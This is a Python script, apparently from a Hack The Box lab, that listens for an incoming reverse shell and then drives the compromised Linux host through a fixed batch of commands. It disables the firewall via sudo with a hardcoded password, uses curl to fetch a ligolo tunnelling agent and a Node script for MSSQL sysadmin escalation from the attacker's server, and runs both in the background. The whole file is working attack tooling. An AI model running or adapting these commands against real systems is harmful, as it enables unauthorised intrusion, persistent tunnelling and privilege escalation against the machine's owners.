#!/usr/bin/env python3
"""Single reverse shell: ligolo + mssql sysadmin + xp_cmdshell whoami."""
import socket
import threading
import sys
import time

PORT = 5555
PASS = r"opc0932k90%%lODFI93-++"
LHOST = "10.10.15.183"

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT))
s.listen(1)
print("listen", PORT, flush=True)
c, a = s.accept()
print("conn", a, flush=True)
out = open(r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\session_out.txt", "wb")


def recv():
    while True:
        d = c.recv(8192)
        if not d:
            break
        out.write(d)
        out.flush()
        sys.stdout.buffer.write(d)
        sys.stdout.flush()


threading.Thread(target=recv, daemon=True).start()
time.sleep(1)

cmds = [
    f"echo '{PASS}' | sudo -S ufw disable",
    f"curl -fsSL -o /tmp/agent64 http://{LHOST}:8090/agent64 && chmod +x /tmp/agent64",
    f"pkill -f 'agent64 -connect' 2>/dev/null; nohup /tmp/agent64 -connect {LHOST}:11601 -ignore-cert >/tmp/agent.log 2>&1 &",
    f"curl -fsSL -o /tmp/mssql_sysadmin.js http://{LHOST}:8090/mssql_sysadmin.js",
    "cd /home/webadmin/aegis && node /tmp/mssql_sysadmin.js",
    "cat /tmp/agent.log; echo ===DONE===",
]
for cmd in cmds:
    print("\n>>>", cmd, flush=True)
    c.send((cmd + "\n").encode())
    time.sleep(6 if ("curl" in cmd or "node" in cmd) else 2)

time.sleep(10)
print("\nbatch finished", flush=True)
# keep shell open a bit then close
time.sleep(2)
c.close()
out.close()
